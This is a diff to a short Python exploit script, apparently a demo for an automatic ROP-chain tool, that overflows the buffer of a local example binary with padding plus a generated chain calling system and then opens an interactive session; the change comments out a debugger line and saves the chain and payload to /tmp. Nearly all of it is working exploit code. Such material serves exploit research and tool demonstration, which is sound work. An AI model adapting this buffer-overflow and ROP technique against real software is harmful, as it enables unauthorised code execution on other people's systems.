@@ -4,7 +4,7 @@ import ropme, goal
 
 filename = './example/bof_system'
 p = process([filename,'3000'])
-gdb.attach(p, "set disassembly-flavor intel\nbreak *system\nbreak *execve\nset follow-fork-mode child\ncatch syscall execve")
+#gdb.attach(p, "set disassembly-flavor intel\nbreak *system\nbreak *execve\nset follow-fork-mode child\ncatch syscall execve")
 
 print "Using automatically built ROP chain"
 files = [(filename, 0)]
@@ -14,5 +14,9 @@ goal_resolver = goal.create_from_arguments(files, [["function", "system", sleep_
 rop = ropme.rop(files, goal_resolver, logging.CRITICAL)
 
 payload = 'A'*512 + 'B'*8 + rop
+
+with open("/tmp/rop", "w") as f: f.write(rop)
+with open("/tmp/payload", "w") as f: f.write(payload)
+
 p.writeline(payload)
 p.interactive()
